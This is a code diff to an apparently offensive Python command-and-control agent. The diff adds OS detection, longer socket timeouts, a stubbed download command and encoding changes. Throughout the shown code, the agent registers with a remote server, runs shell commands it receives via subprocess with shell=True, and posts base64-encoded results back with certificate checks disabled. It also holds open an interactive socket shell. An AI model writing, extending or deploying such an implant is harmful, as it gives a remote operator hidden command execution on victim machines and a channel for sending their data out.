@@ -6,6 +6,7 @@ import socket
 import struct
 from time import sleep
 import os
+import platform
 
 is_base64_enabled = True
 
@@ -14,7 +15,7 @@ sessions_host = '127.0.0.1'
 sessions_port = 5555
 name = ""
 delay = 10
-
+os_name = platform.system()
 
 
 def send_msg(sock, msg):
@@ -84,7 +85,7 @@ def sessions_shell():
     while True:
         try:
             # hold the connection open for some time
-            client_socket.settimeout(360.0)
+            client_socket.settimeout(1800.0)
 
             print(f"cmd before:")
 
@@ -109,6 +110,9 @@ def sessions_shell():
             elif cmd == 'c2-sessions ping':
                 print("c2-sessions ping")
                 send_msg(client_socket,str.encode('c2-sessions pong'))
+
+            elif cmd == 'c2-sessions download':
+                pass
                 
             elif "c2-sessions cmd" in cmd:
                 command = " ".join(cmd.split()[2:])
@@ -151,14 +155,18 @@ def sessions_shell():
 
 
     if client_socket:
-        client_socket.shutdown(2)
-        client_socket.close()
+        try:
+            client_socket.shutdown(2)
+            client_socket.close()
+        except Exception:
+            # just continue
+            pass
 
 
 def register():    
     # Send a POST request to localhost/register and display the response
     url = f"{host}/register"
-    data = {"type": "linux"}
+    data = {"type": os_name}
     response = requests.post(url, data=data, verify=False)
     print(f"Server response: {response.text}")
     return response.text
@@ -181,7 +189,7 @@ def post_results(output):
     url = f"{host}/results/{name}"    
     encoded_data = output
     if is_base64_enabled:
-        encoded_data = base64.b64encode(output.encode("utf-8"))
+        encoded_data = base64.b64encode(output)
     data = {"result": encoded_data}
     response = requests.post(url, data=data, verify=False)
     print(f"Server response: {response.text}")
@@ -222,10 +230,11 @@ while True:
             elif cmd[0] == "c2-shell":
                 command = ' '.join(cmd[1:])
                 result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)                
+                #result = subprocess.check_output(["powershell.exe", "-Command", command])
                 #result.wait()
                 output = result.stdout + result.stderr
                 # output = result.stdout.decode("utf-8")                
-                post_results(output.decode("utf-8") )           
+                post_results(output)           
             elif cmd[0] == "c2-session":
                 try:                    
                     sessions_port = int(' '.join(cmd[1:]))
